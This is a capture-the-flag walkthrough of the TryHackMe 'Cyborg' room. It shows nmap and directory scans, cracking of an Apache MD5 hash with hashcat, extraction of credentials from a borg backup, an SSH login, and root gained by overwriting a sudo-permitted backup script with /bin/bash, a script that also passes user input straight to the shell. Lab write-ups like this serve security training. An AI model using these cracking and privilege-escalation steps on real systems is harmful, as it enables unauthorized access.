![image.png](screenshots\cyborg-logo.jpeg)

# Cyborg

A box involving encrypted archives, source code analysis and more.

45 min

https://tryhackme.com/room/cyborgt8

# Reconnaissance

## Nmap

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15

```

## Dirsearch

```bash
Target: http://cyborg.thm/

[21:01:36] Starting: 
[21:01:38] 403 -  275B  - /.ht_wsr.txt                                      
[21:01:38] 403 -  275B  - /.htaccess.sample                                 
[21:01:38] 403 -  275B  - /.htaccess.save
[21:01:38] 403 -  275B  - /.htaccess.orig
[21:01:38] 403 -  275B  - /.htaccess.bak1                                   
[21:01:38] 403 -  275B  - /.htaccess_orig                                   
[21:01:38] 403 -  275B  - /.htaccess_extra
[21:01:38] 403 -  275B  - /.htaccess_sc
[21:01:38] 403 -  275B  - /.htaccessBAK
[21:01:38] 403 -  275B  - /.htaccessOLD
[21:01:38] 403 -  275B  - /.htaccessOLD2                                    
[21:01:38] 403 -  275B  - /.htpasswds                                       
[21:01:38] 403 -  275B  - /.httr-oauth                                      
[21:01:38] 403 -  275B  - /.html                                            
[21:01:38] 403 -  275B  - /.htpasswd_test                                   
[21:01:38] 403 -  275B  - /.htm                                             
[21:01:41] 301 -  308B  - /admin  ->  http://cyborg.thm/admin/              
[21:01:41] 200 -    2KB - /admin/                                           
[21:01:41] 200 -    2KB - /admin/admin.html                                 
[21:01:42] 200 -    2KB - /admin/index.html                                 
[21:01:50] 301 -  306B  - /etc  ->  http://cyborg.thm/etc/                  
[21:01:50] 200 -  442B  - /etc/                                             
[21:02:01] 403 -  275B  - /server-status/                                   
[21:02:01] 403 -  275B  - /server-status
```

## Web Recon

/admin

![image.png](screenshots\1-AdminPanel.png)

- We might have some users `alex` `adam` `josh` .
- The website is potentially insecure (no proxy).
- There is a backup `music_archive` meaning there is possibly a cron job running from a script somewhere.
- On Archive and Download → We got `archive.tar` file.

/etc

![image.png](screenshots\2-Password.png)

- We found `music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.` → Password hash (MD5)

```bash
hashid '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.'
Analyzing '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.'
[+] MD5(APR) 
[+] Apache MD5 
```

### Hashcat

```bash
hashcat -m 1600 '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' /usr/share/wordlists/rockyou.txt

$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:**squidward**           
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
Time.Started.....: Mon Dec  1 21:30:13 2025 (2 secs)
Time.Estimated...: Mon Dec  1 21:30:15 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:    15995 H/s (12.98ms) @ Accel:80 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 39040/14344385 (0.27%)
Rejected.........: 0/39040 (0.00%)
Restore.Point....: 38720/14344385 (0.27%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidate.Engine.: Device Generator
Candidates.#01...: 290586 -> pinche
Hardware.Mon.#01.: Util: 94%

Started: Mon Dec  1 21:29:34 2025
Stopped: Mon Dec  1 21:30:17 2025
```

- We cracked the password : **`squidward`**

### Archive file

- We extracted `archive.tar`

```bash
tar -xf archive.tar
```

- We looked inside and found a piece of info about Borg.

![image.png](screenshots\3-Readme.png)

[https://borgbackup.readthedocs.io/](https://borgbackup.readthedocs.io/)

- By looking in the docs we installed Borg.

```bash
sudo apt install borgbackup
```

- We listed the `final_archive` and entered passphrase previously found.

```bash
borg list final_archive
Enter passphrase for key /home/cyber/Downloads/home/field/dev/final_archive: 
music_archive                        Tue, 2020-12-29 09:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]

```

- We mounted the archive.

![image.png](screenshots\4-MountArchive.png)

```bash
borg mount ./final_archive /home/cyber/THM/CTF/Cyborg
```

- We looked into the `music_archive` and found a `note.txt` with some credentials.

/home/cyber/THM/CTF/Cyborg/music_archive/home/alex/Documents/

![image.png](screenshots\5-Note.png)

alex:S3cretP@s3

# SSH

```bash
ssh alex@cyborg.thm
The authenticity of host 'cyborg.thm (10.64.144.75)' can't be established.
ED25519 key fingerprint is: SHA256:hJwt8CvQHRU+h3WUZda+Xuvsp1/od2FFuBvZJJvdSHs
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cyborg.thm' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
alex@cyborg.thm's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

27 packages can be updated.
0 updates are security updates.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

alex@ubuntu:~$ 

```

- We are in and we got the `user.txt` flag!

![image.png](screenshots\6-UserFlag.png)

# Root

- We did `sudo -l` and found a backup script.

```bash
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
alex@ubuntu:~$ cat /etc/mp3backups/backup.sh
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt

input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done

backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd

```

- We changed the permissions of [`backup.sh`](http://backup.sh) file.

```bash
chmod 777 /etc/mp3backups/backup.sh
```

- We added `/bin/bash` to the script.

```bash
alex@ubuntu:/etc/mp3backups$ echo "/bin/bash" > /etc/mp3backups/backup.sh
alex@ubuntu:/etc/mp3backups$ sudo /etc/mp3backups/backup.sh
root@ubuntu:/etc/mp3backups# whoami
root
root@ubuntu:/etc/mp3backups# cd /root
root@ubuntu:/root# ls
root.txt
root@ubuntu:/root# cat root.txt
flag{REDACTED}

```

- We got `root` and found the flag!

![image.png](screenshots\7-THMAnswers.png)
